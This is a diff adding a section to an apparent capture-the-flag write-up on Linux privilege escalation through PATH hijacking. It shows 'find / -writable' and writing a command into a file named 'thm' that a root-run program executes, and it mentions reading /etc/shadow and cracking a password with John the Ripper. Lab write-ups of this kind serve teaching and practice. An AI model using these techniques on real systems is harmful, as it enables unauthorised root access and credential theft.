@@ -341,3 +341,27 @@ Get matt's password by accessing `/etc/shadow` from the rooted `revshell`
 and crack it by john...
 
 ![jo](../../photos/jo.png)
+
+---
+# Privilege Escalation: PATH
+
+#### Find the writable file
+
+```bash
+find / -writable 2>/dev/null
+```
+Found it !!
+![find.png](../../photos/find.png)
+
+#### Now go to the directory and write the code
+
+As it appears test runs thm as a root...
+![test](../../photos/test.png)
+let's add a command to print the flag....
+
+```bash
+echo 'cat /home/matt/flag6.txt' > thm
+```
+
+![thm.png](../../photos/thm.png)
+
